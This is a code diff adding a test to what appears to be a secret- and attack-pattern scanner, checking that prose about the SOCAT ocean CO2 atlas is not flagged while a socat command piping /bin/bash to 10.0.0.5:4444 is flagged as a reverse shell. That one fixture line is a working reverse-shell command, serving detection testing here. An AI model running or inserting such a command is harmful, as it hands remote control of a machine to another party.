@@ -169,6 +169,18 @@ class TestScanFile:
         assert findings == []
 
 
+    def test_socat_prose_is_not_a_reverse_shell_but_a_socat_relay_is(self, tmp_path):
+        prose = tmp_path / "ocean.md"
+        prose.write_text(
+            "Load the SOCAT v2023 surface ocean CO2 atlas and merge with the socat cruise index.\n",
+            encoding="utf-8",
+        )
+        assert not any(fi.pattern_id == "reverse_shell" for fi in scan_file(prose, "ocean.md"))
+
+        shell = tmp_path / "shell.sh"
+        shell.write_text("socat TCP:10.0.0.5:4444 EXEC:/bin/bash,pty,stderr\n", encoding="utf-8")
+        assert any(fi.pattern_id == "reverse_shell" for fi in scan_file(shell, "shell.sh"))
+
     def test_detect_gitlab_pat(self, tmp_path):
         f = tmp_path / "leak.md"
         # Concatenated so no contiguous token literal exists in this file
